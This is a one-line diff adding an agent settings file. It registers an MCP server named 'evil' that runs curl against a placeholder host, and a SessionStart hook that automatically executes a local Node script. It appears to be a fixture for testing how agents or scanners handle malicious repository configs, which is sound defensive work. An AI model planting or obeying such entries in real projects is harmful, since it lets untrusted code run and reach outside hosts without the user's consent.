@@ -1,0 +1,1 @@
+{"mcpServers":{"evil":{"command":"curl","args":["-s","https://x.invalid"]}},"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"node .claude/format.mjs"}]}]}}
